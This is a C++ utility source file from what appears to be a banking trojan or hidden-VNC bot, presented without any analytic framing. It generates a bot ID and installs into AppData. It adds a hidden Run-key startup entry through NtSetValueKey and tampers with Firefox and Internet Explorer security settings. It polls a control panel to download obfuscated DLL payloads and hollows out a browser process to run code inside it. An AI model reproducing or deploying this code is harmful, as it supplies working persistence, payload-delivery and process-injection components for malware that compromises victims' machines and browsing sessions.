#include "Utils.h"

char *UnEnc(char *enc, char *key, DWORD encLen)
{
   char *unEnc = (char *) LocalAlloc(LPTR, encLen + 1);
   unEnc[encLen] = 0;
   for(DWORD i = 0; i < encLen; ++i)
      unEnc[i] = enc[i] ^ key[i % lstrlenA(key)];
   return unEnc;
}

ULONG PseudoRand(ULONG *seed)
{
   return (*seed = 1352459 * (*seed) + 2529004207);
}

void GetBotId(char *botId)
{
   CHAR windowsDirectory[MAX_PATH];
   CHAR volumeName[8] = { 0 };
   DWORD seed = 0;

   if(!Funcs::pGetWindowsDirectoryA(windowsDirectory, sizeof(windowsDirectory)))
      windowsDirectory[0] = L'C';
   
   volumeName[0] = windowsDirectory[0];   
   volumeName[1] = ':';
   volumeName[2] = '\\';
   volumeName[3] = '\0';

   Funcs::pGetVolumeInformationA(volumeName, NULL, 0, &seed, 0, NULL, NULL, 0);

   GUID guid;
   guid.Data1 =          PseudoRand(&seed);
   
   guid.Data2 = (USHORT) PseudoRand(&seed);
   guid.Data3 = (USHORT) PseudoRand(&seed);
   for(int i = 0; i < 8; i++)
      guid.Data4[i] = (UCHAR) PseudoRand(&seed);

   Funcs::pWsprintfA(botId, "%08lX%04lX%lu", guid.Data1, guid.Data3, *(ULONG*) &guid.Data4[2]);
}

void Obfuscate(BYTE *buffer, DWORD bufferSize, char *key)
{
   for(DWORD i = 0; i < bufferSize; ++i)
      buffer[i] = buffer[i] ^ key[i % Funcs::pLstrlenA(key)];
}

char *Utf16toUtf8(wchar_t *utf16)
{
   if(!utf16)
      return NULL;
   int strLen = Funcs::pWideCharToMultiByte(CP_UTF8, 0, utf16, -1, NULL, 0, NULL, NULL);
   if(!strLen)
      return NULL;
   char *ascii = (char *) Alloc(strLen + 1);
   if(!ascii)
      return NULL;
   Funcs::pWideCharToMultiByte(CP_UTF8, 0, utf16, -1, ascii, strLen, NULL, NULL);
   return ascii;
}

wchar_t *Utf8toUtf16(const char *utf8)
{
   if(!utf8)
      return NULL;
   int strLen = Funcs::pMultiByteToWideChar(CP_UTF8, 0, utf8, -1, NULL, 0);
   if(!strLen)
      return NULL;
   wchar_t *converted = (wchar_t *) Alloc((strLen + 1) * sizeof(wchar_t));
   if(!converted)
      return NULL;
   Funcs::pMultiByteToWideChar(CP_UTF8, 0, utf8, -1, converted, strLen);
   return converted;
}

void GetInstallPath(char *installPath)
{
   char botId[BOT_ID_LEN] = { 0 };
   GetBotId(botId);
   Funcs::pSHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, installPath);
   Funcs::pLstrcatA(installPath, Strs::fileDiv);
   Funcs::pLstrcatA(installPath, botId);

   Funcs::pCreateDirectoryA(installPath, NULL); 

   Funcs::pLstrcatA(installPath, Strs::fileDiv);
   Funcs::pLstrcatA(installPath, botId);
   Funcs::pLstrcatA(installPath, Strs::exeExt);
}

BOOL GetUserSidStr(PCHAR *sidStr)
{
   DWORD   userNameSize = MAX_PATH;
   char    userName[MAX_PATH] = { 0 };
   Funcs::pGetUserNameExA(NameSamCompatible, userName, &userNameSize);

   SID         *sid;
   SID_NAME_USE peUse;
   char        *refDomainName;
   DWORD        sidSize           = 0;
   DWORD        refDomainNameSize = 0;
   BOOL         success           = FALSE;

   Funcs::pLookupAccountNameA(NULL, userName, NULL, &sidSize, NULL, &refDomainNameSize, &peUse);
   if(Funcs::pGetLastError() == ERROR_INSUFFICIENT_BUFFER)
   {
      sid           = (SID *)  Alloc(sidSize);
      refDomainName = (char *) Alloc(refDomainNameSize * sizeof(wchar_t));
      if(sid && refDomainName)
      {
         if(Funcs::pLookupAccountNameA(NULL, userName, sid, &sidSize, refDomainName, &refDomainNameSize, &peUse))
         {
            if(Funcs::pConvertSidToStringSidA(sid, sidStr)) 
               success = TRUE;
         }
      }
   }
   Funcs::pFree(refDomainName);
   Funcs::pFree(sid);
   return success;
}

HANDLE NtRegOpenKey(LPCTSTR subKey)
{
   char     key[MAX_PATH] = { 0 };
   char    *sid           = NULL;
   HANDLE   hKey          = NULL;

   if(GetUserSidStr(&sid))
   {
      Funcs::pWsprintfA(key, Strs::ntRegPath, sid, subKey);

      UNICODE_STRING uKey;
      uKey.Buffer        = Utf8toUtf16(key);
      uKey.Length        = (USHORT) Funcs::pLstrlenA(key) * sizeof(wchar_t);
      uKey.MaximumLength = uKey.Length;
     
      OBJECT_ATTRIBUTES objAttribs;
      
      objAttribs.Length                     = sizeof(objAttribs);
      objAttribs.Attributes               = OBJ_CASE_INSENSITIVE;
      objAttribs.ObjectName               = &uKey;
      objAttribs.RootDirectory            = NULL;
      objAttribs.SecurityDescriptor         = NULL;
      objAttribs.SecurityQualityOfService = 0;
      
      Funcs::pNtOpenKey(&hKey, KEY_ALL_ACCESS, &objAttribs);
   }
   Funcs::pLocalFree(sid);
   return hKey;
}

NTSTATUS NtRegSetValue(HANDLE hKey, BYTE *valueName, DWORD valueNameSize, DWORD type, BYTE *data, DWORD dataSize)
{
   UNICODE_STRING uValueName;
   uValueName.Buffer        = (wchar_t *) valueName;
   uValueName.Length        = (USHORT) valueNameSize;
   uValueName.MaximumLength = uValueName.Length;
   return Funcs::pNtSetValueKey(hKey, &uValueName, NULL, type, data, dataSize);
}

void SetStartupValue(char *path)
{
   HANDLE hKey = NtRegOpenKey(Strs::userRunKey);
   char botId[BOT_ID_LEN] = { 0 };
   GetBotId(botId);

   DWORD    botIdLen   = Funcs::pLstrlenA(botId);
   DWORD    botIdSizeW = botIdLen * sizeof(wchar_t);
   wchar_t *botIdW = Utf8toUtf16(botId);
   wchar_t  regValueName[128] = { 0 };
   regValueName[0] = 0;

   Funcs::pMemcpy(regValueName + 1, botIdW, botIdSizeW);
   regValueName[botIdLen + 1] = 0;
   Funcs::pFree(botIdW);

   wchar_t *pathW     = Utf8toUtf16(path);
   DWORD    pathWsize = Funcs::pLstrlenA(path) * sizeof(wchar_t);

   NtRegSetValue(hKey, (BYTE *) regValueName, botIdSizeW + sizeof(wchar_t), REG_SZ, (BYTE *) pathW, pathWsize);

   Funcs::pFree(pathW);
   Funcs::pCloseHandle(hKey);                             
}

BOOL VerifyPe(BYTE *pe, DWORD peSize)
{
   if(peSize > 1024 && pe[0] == 'M' && pe[1] == 'Z')
      return TRUE;
   return FALSE;
}

BOOL IsProcessX64(HANDLE hProcess)
{
   SYSTEM_INFO systemInfo;
   Funcs::pGetNativeSystemInfo(&systemInfo);
   if(systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
      return FALSE;

   BOOL wow64;
   Funcs::pIsWow64Process(hProcess, &wow64);
   if(wow64)
      return FALSE;
    
   return TRUE;
}

void *AllocZ(size_t size)
{
   void *mem = Alloc(size);
   Funcs::pMemset(mem, 0, size);
   return mem;
}

void *Alloc(size_t size)
{
   void *mem = Funcs::pMalloc(size);
   return mem;
}

void *ReAlloc(void *mem2realloc, size_t size)
{   
   void *mem = Funcs::pRealloc(mem2realloc, size);
   return mem;
}

#pragma function(memset)
void * __cdecl memset(void *pTarget, int value, size_t cbTarget)
{
   unsigned char *p = static_cast<unsigned char *>(pTarget);
   while(cbTarget-- > 0)
   {
      *p++ = static_cast<unsigned char>(value);
   }
   return pTarget;
}

DWORD GetPidExplorer()
{
   for(;;)
   {
      HWND hWnd = Funcs::pFindWindowA(Strs::shell_TrayWnd, NULL);
      if(hWnd)
      {
         DWORD pid;
         Funcs::pGetWindowThreadProcessId(hWnd, &pid);
         return pid;
      }
      Sleep(500);
   }
}

void SetFirefoxPrefs()
{
   char appData[MAX_PATH];
   if(Funcs::pExpandEnvironmentStringsA(Strs::exp1, appData, MAX_PATH) > 0)
   {
      char ffDir[MAX_PATH];
      Funcs::pWsprintfA(ffDir, Strs::exp2, appData, Strs::exp3, Strs::exp4, Strs::exp5);
      if(ffDir)
      {
         char sections[1024] = { 0 };
         if(Funcs::pGetPrivateProfileSectionNamesA(sections, sizeof(sections), ffDir) > 0)
         {
            char *entry = sections;
            for(;;)
            {
               if(Funcs::pStrncmp(entry, Strs::exp6, 7) == 0)
               {  
                  char randomDir[MAX_PATH]; 
                  if(Funcs::pGetPrivateProfileStringA(entry, Strs::exp7, 0, randomDir, MAX_PATH, ffDir) > 0)
                  {
                     int nPos = 0;
                     for(; nPos < 64; ++nPos)
                     {
                        if(randomDir[nPos] == '/')
                        {
                           Funcs::pMemcpy(randomDir, randomDir + nPos + 1, (sizeof randomDir - nPos) + 1);
                           break;
                        }
                     }
                     Funcs::pMemset(ffDir, 0, MAX_PATH);
   
                     Funcs::pWsprintfA(ffDir, Strs::exp8, appData, 
                          Strs::exp3,  Strs::exp4, Strs::exp5, randomDir, Strs::exp9);
             
                     if(ffDir)
                     {
                        HANDLE ffPrefs = Funcs::pCreateFileA
                        (
                           ffDir, GENERIC_READ | GENERIC_WRITE, 0, 0, 
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0
                        );
                
                        if(ffPrefs != INVALID_HANDLE_VALUE)
                        {
                           DWORD fileSize = Funcs::pGetFileSize(ffPrefs, NULL);
                           char *fBuffer  = (CHAR *) Alloc(fileSize + 1); 
                           DWORD bRead, bWritten;
                           if(Funcs::pReadFile(ffPrefs, fBuffer, fileSize, &bRead, NULL) == TRUE)
                           {
                              fBuffer[bRead] = '\0';

                              char botId[BOT_ID_LEN] = { 0 };
                              GetBotId(botId);
                            
                              char botIdComment[BOT_ID_LEN + 10] = { 0 };
                              botIdComment[0] = '#';
                              Funcs::pLstrcatA(botIdComment, botId);
                              Funcs::pLstrcatA(botIdComment, Strs::winNewLine);

                              if(!Funcs::pStrStrA(fBuffer, botIdComment))
                              {
                                 Funcs::pWriteFile(ffPrefs, Strs::exp12, Funcs::pLstrlenA(Strs::exp12), &bWritten, NULL);
                                 Funcs::pWriteFile(ffPrefs, botIdComment, Funcs::pLstrlenA(botIdComment), &bWritten, NULL);
                              }
                              Funcs::pCloseHandle(ffPrefs);
                              return;
                           }  
                           Funcs::pFree(fBuffer);                 
                        }
                        Funcs::pCloseHandle(ffPrefs);
                        return;
                     }
                  }
               }
               entry += Funcs::pLstrlenA(entry) + 1;
               if(!entry[0])
                  break; 
            }
         }
      }
   }
}

void DisableMultiProcessesAndProtectedModeIe()
{
   HKEY  result;
   DWORD data = 0;
   if(Funcs::pRegOpenKeyExA(HKEY_CURRENT_USER, Strs::exp13, 0, KEY_ALL_ACCESS, &result) == ERROR_SUCCESS)
   {
      Funcs::pRegSetValueExA(result, Strs::exp14, 0, REG_DWORD, (BYTE *) &data, sizeof(DWORD));
      data = 1;
      Funcs::pRegSetValueExA(result, Strs::exp19, 0, REG_DWORD, (BYTE *) &data, sizeof(DWORD));
      Funcs::pRegCloseKey(result);
   }
   if(Funcs::pRegOpenKeyExA(HKEY_CURRENT_USER, Strs::exp15, 0, KEY_ALL_ACCESS, &result) == ERROR_SUCCESS)
   {
      data = 3;
      Funcs::pRegSetValueExA(result, Strs::exp16, 0, REG_DWORD, (BYTE *) &data, sizeof(DWORD));
      Funcs::pRegCloseKey(result);
   }
}

void CopyDir(char *from, char *to)
{
   char fromWildCard[MAX_PATH] = { 0 };
   Funcs::pLstrcpyA(fromWildCard, from);
   Funcs::pLstrcatA(fromWildCard, "\\*");

   if(!Funcs::pCreateDirectoryA(to, NULL) && Funcs::pGetLastError() != ERROR_ALREADY_EXISTS)
      return;
   WIN32_FIND_DATAA findData;
   HANDLE hFindFile = Funcs::pFindFirstFileA(fromWildCard, &findData);
   if(hFindFile == INVALID_HANDLE_VALUE)
      return;

   do
   {
      char currFileFrom[MAX_PATH] = { 0 };
      Funcs::pLstrcpyA(currFileFrom, from);
      Funcs::pLstrcatA(currFileFrom, "\\");
      Funcs::pLstrcatA(currFileFrom, findData.cFileName);

      char currFileTo[MAX_PATH] = { 0 };
      Funcs::pLstrcpyA(currFileTo, to);
      Funcs::pLstrcatA(currFileTo, "\\");
      Funcs::pLstrcatA(currFileTo, findData.cFileName);

      if
      (
         findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY && 
         Funcs::pLstrcmpA(findData.cFileName, ".") && 
         Funcs::pLstrcmpA(findData.cFileName, "..")
      )
      {
         if(Funcs::pCreateDirectoryA(currFileTo, NULL) || Funcs::pGetLastError() == ERROR_ALREADY_EXISTS)
            CopyDir(currFileFrom, currFileTo);
      }
      else
         Funcs::pCopyFileA(currFileFrom, currFileTo, FALSE);
   } while(Funcs::pFindNextFileA(hFindFile, &findData));
}

static BYTE *ReadDll(char *path, char *botId)
{
   HANDLE hFile = Funcs::pCreateFileA
   (
      path, 
      GENERIC_READ, 
      0, 
      NULL, 
      OPEN_EXISTING, 
      FILE_ATTRIBUTE_NORMAL, 
      NULL
   );
   if(hFile == INVALID_HANDLE_VALUE)
      return NULL;

   DWORD fileSize = Funcs::pGetFileSize(hFile, NULL);
   if(fileSize < 1024)
      return NULL;

   BYTE *contents = (BYTE *) Alloc(fileSize);
   DWORD read;
   Funcs::pReadFile(hFile, contents, fileSize, &read, NULL);
   Obfuscate(contents, fileSize, botId);
   if(!VerifyPe(contents, fileSize))
   {
      Funcs::pFree(contents);
      contents = NULL;
   }
   Funcs::pCloseHandle(hFile);
   return contents;
}

static void DownloadDll(char *path, BOOL x64, char *botId)
{
   char command[32] = { 0 };
   if(!x64)
      Funcs::pLstrcpyA(command, Strs::dll32binRequest);
   else
      Funcs::pLstrcpyA(command, Strs::dll64binRequest);

   int   dllSize;
   BYTE *dll;
   for(;;)
   {
      dll = (BYTE *) PanelRequest(command, &dllSize);
      if(VerifyPe(dll, dllSize))
         break;
      Funcs::pFree(dll);
      Funcs::pSleep(POLL);
   }
   Obfuscate(dll, dllSize, botId);
   HANDLE hFile = Funcs::pCreateFileA
   (
      path, 
      GENERIC_WRITE, 
      0, 
      NULL, 
      CREATE_ALWAYS, 
      FILE_ATTRIBUTE_NORMAL, 
      NULL
   );
   DWORD written;
   Funcs::pWriteFile(hFile, dll, dllSize, &written, NULL);
   Funcs::pCloseHandle(hFile);
   Funcs::pFree(dll);
}

void GetTempPathBotPrefix(char *path)
{
   Funcs::pGetTempPathA(MAX_PATH, path);
   char botId[BOT_ID_LEN] = { 0 };
   GetBotId(botId);
   Funcs::pLstrcatA(path, botId);
}

static HANDLE hX86 = NULL;
static HANDLE hX64 = NULL;

void GetDlls(BYTE **x86, BYTE **x64, BOOL update)
{
   char x86cachePath[MAX_PATH] = { 0 };
   char x64cachePath[MAX_PATH] = { 0 };
   char cachePath[MAX_PATH]    = { 0 };
   char botId[BOT_ID_LEN]      = { 0 };
   SYSTEM_INFO info            = { 0 };

   GetBotId(botId);
   Funcs::pGetNativeSystemInfo(&info);

   GetTempPathBotPrefix(cachePath);
   Funcs::pLstrcpyA(x86cachePath, cachePath);
   Funcs::pLstrcatA(x86cachePath, Strs::dll32cachePrefix);

   if(update)
   {
      Funcs::pCloseHandle(hX86);
      DownloadDll(x86cachePath, FALSE, botId);
      hX86 = Funcs::pCreateFileA(x86cachePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
   }
   else
   {
      while(!(*x86 = ReadDll(x86cachePath, botId)))
         DownloadDll(x86cachePath, FALSE, botId);
   }

   if(info.wProcessorArchitecture != PROCESSOR_ARCHITECTURE_AMD64 || (x64 == NULL && !update))
      return;

   Funcs::pLstrcpyA(x64cachePath, cachePath);
   Funcs::pLstrcatA(x64cachePath, Strs::dll64cachePrefix);

   if(update)
   {
      Funcs::pCloseHandle(hX64);
      DownloadDll(x86cachePath, TRUE, botId);
      hX64 = Funcs::pCreateFileA(x64cachePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
   }
   else
   {
      while(!(*x64 = ReadDll(x64cachePath, botId)))
         DownloadDll(x64cachePath, TRUE, botId);
   }
}

DWORD BypassTrusteer(PROCESS_INFORMATION *processInfoParam, char *browserPath, char *browserCommandLine)
{
   HANDLE hBrowser = Funcs::pCreateFileA
   (
      browserPath, 
      GENERIC_READ, 
      0, 
      NULL, 
      OPEN_EXISTING, 
      FILE_ATTRIBUTE_NORMAL, 
      NULL
   );

   if(hBrowser == INVALID_HANDLE_VALUE)
      return NULL;

   BOOL  ret = NULL;
   DWORD read;
   DWORD browserSize = Funcs::pGetFileSize(hBrowser, NULL);
   BYTE *browser     = (BYTE *) Alloc(browserSize);

   Funcs::pReadFile(hBrowser, browser, browserSize, &read, NULL);
   Funcs::pCloseHandle(hBrowser);

   STARTUPINFOA        startupInfo        = { 0 };
   PROCESS_INFORMATION processInfo        = { 0 };
   if(!processInfoParam)
   {
      Funcs::pCreateProcessA
      (
         browserPath, 
         browserCommandLine, 
         NULL, 
         NULL, 
         FALSE, 
         CREATE_SUSPENDED, 
         NULL, 
         NULL, 
         &startupInfo, 
         &processInfo
      );
   }
   else
      processInfo = *processInfoParam;

   IMAGE_DOS_HEADER         *dosHeader        = (IMAGE_DOS_HEADER *) browser;
   IMAGE_NT_HEADERS         *ntHeaders        = (IMAGE_NT_HEADERS *) (browser + dosHeader->e_lfanew);
   IMAGE_SECTION_HEADER     *sectionHeader    = (IMAGE_SECTION_HEADER *) (ntHeaders + 1);
   PROCESS_BASIC_INFORMATION processBasicInfo = { 0 };
   CONTEXT                   context          = { 0 };
   DWORD                     retSize;

   context.ContextFlags = CONTEXT_FULL;
   if(!Funcs::pGetThreadContext(processInfo.hThread, &context))
      goto exit;

   PVOID remoteAddress = Funcs::pVirtualAllocEx
   (
      processInfo.hProcess, 
      LPVOID(ntHeaders->OptionalHeader.ImageBase), 
      ntHeaders->OptionalHeader.SizeOfImage, 
      0x3000, 
      PAGE_EXECUTE_READWRITE
   );
   if(!Funcs::pWriteProcessMemory(processInfo.hProcess, remoteAddress, browser, ntHeaders->OptionalHeader.SizeOfHeaders, NULL))
      goto exit;
   for(int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i)
   {
      if(!Funcs::pWriteProcessMemory
      (
         processInfo.hProcess, 
         LPVOID(DWORD64(remoteAddress) + sectionHeader[i].VirtualAddress), 
         browser + sectionHeader[i].PointerToRawData, 
         sectionHeader[i].SizeOfRawData, 
         NULL
      )) goto exit;
   }

   Funcs::pNtQueryInformationProcess(processInfo.hProcess, (LPVOID) 0, &processBasicInfo, sizeof(processBasicInfo), &retSize);

   if(!Funcs::pWriteProcessMemory(processInfo.hProcess, LPVOID(DWORD64(processBasicInfo.PebBaseAddress) + sizeof(LPVOID) * 2), &remoteAddress, sizeof(LPVOID), NULL))
      goto exit;
#ifndef _WIN64
   context.Eax = (DWORD) remoteAddress + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#else
   context.Rcx = (DWORD64) remoteAddress + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#endif

   if(!Funcs::pSetThreadContext(processInfo.hThread, &context))
      goto exit;
   Funcs::pResumeThread(processInfo.hThread);
   ret = processInfo.dwProcessId;
exit:
   Funcs::pCloseHandle(processInfo.hProcess);
   Funcs::pCloseHandle(processInfo.hThread);
   Funcs::pFree(browser);
   return ret;
}